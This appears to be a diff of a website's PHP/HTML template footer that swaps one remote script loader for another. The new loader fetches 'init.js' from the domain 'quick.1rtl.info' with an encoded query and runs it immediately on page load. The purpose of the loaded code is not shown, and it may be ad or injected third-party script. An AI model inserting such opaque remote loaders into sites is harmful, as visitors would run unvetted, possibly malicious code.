@@ -273,17 +273,18 @@ $calendarsYear = date('m') == 12 && date('j') > 15 ? date('Y') + 1 : date('Y');
     </div>
 </div>
 <script type="text/javascript" src="/bw15/js/mobile_menu.js"></script>
-<div id="zcbclk41923"></div><script type="text/javascript">
+<script type="text/javascript">
     (function(w){var l = function() {
         var n = document.getElementsByTagName("script")[0],
             s = document.createElement("script"),
             ins = function () { n.parentNode.insertBefore(s, n); };
         s.type = "text/javascript";
         s.async = true;
-        s.src = "//rt.rtl1.biz/init.js?8VAVMSlQeWlFcBQwJAQoLHlxXdldMaEpdXlFABQg";
+        s.src = "//quick.1rtl.info/init.js?qHUwFAx1XExgVTEVASENCVxUePx4FIQMUFxgJTEE";
         ins();
     };
-        var i = setInterval(function(){ if (document && document.getElementById('zcbclk41923')) { clearInterval(i); l(); } }, 50);})(window);</script>
+        l();
+    })(window);</script>
 
     <!-- Yandex.Metrika counter -->
     <script type="text/javascript">
